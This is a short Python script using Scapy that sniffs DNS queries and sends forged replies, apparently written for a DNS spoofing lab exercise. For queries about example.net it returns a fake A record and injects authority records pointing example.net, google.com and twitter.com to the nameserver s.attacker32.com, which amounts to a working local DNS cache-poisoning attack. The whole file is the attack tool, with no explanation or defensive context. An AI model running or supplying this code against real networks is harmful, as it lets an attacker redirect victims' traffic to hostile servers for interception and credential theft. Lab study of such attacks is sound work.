#!/usr/bin/python
from scapy.all import *
def spoof_dns(pkt):
	
	if (DNS in pkt and "example.net" in pkt[DNS].qd.qname):
		# Swap the source and destination IP address
		ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
		# Swap the source and destination port number
		udp = UDP(dport=pkt[UDP].sport, sport=53)
		# The Answer Section
		Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type="A",
		ttl=259200, rdata="10.0.2.8")
		# The Authority Section
		NSsec1 = DNSRR(rrname="example.net", type="NS",
		ttl=259200, rdata="s.attacker32.com")
		NSsec2 = DNSRR(rrname="google.com", type="NS",
		ttl=259200, rdata="s.attacker32.com")
		NSsec3 = DNSRR(rrname="twitter.com", type="NS",
		ttl=259200, rdata="s.attacker32.com")
		NSsec4 = DNSRR(rrname="twitter.com", type="NS",
		ttl=259200, rdata="s.attacker32.com")
		dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
		qdcount=1, ancount=1, nscount=4, arcount=0,
		an=Anssec, ns=NSsec1/NSsec2/NSsec3/NSsec4)
		# Construct the entire IP packet and send it out
		spoofpkt = ip/udp/dns
		send(spoofpkt)
# Sniff UDP query packets and invoke spoof_dns().
print("Start Sniffing...")
pkt = sniff(filter="udp and dst port 53", prn=spoof_dns)